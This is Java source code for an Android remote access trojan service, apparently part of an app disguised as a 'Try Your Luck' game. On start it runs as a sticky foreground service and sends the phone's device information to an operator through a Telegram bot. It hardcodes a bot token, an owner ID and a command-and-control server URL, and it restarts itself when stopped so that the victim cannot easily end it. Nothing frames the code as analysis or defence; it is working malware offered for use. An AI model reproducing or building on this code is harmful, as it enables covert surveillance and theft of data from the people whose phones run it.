package com.my.luck.core;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.my.luck.network.TelegramBot;

public class RatService extends Service {
    private static final String TAG = "RatService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "rat_channel";
    
    // 🔑 YOUR CREDENTIALS
    private static final String BOT_TOKEN = "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs";
    private static final String OWNER_ID = "8681027856";
    private static final String C2_SERVER = "https://web-0eeh.onrender.com";
    
    private TelegramBot telegramBot;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "RAT Service Started");
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        telegramBot = new TelegramBot(this, BOT_TOKEN, OWNER_ID);
        if (telegramBot != null) {
            telegramBot.sendDeviceInfo();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "RAT Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private NotificationCompat.Builder createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Try Your Luck")
                .setContentText("Running in background...")
                .setSmallIcon(android.R.drawable.ic_menu_gallery)
                .setPriority(NotificationCompat.PRIORITY_LOW);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        Intent restartIntent = new Intent(this, RatService.class);
        startService(restartIntent);
    }
}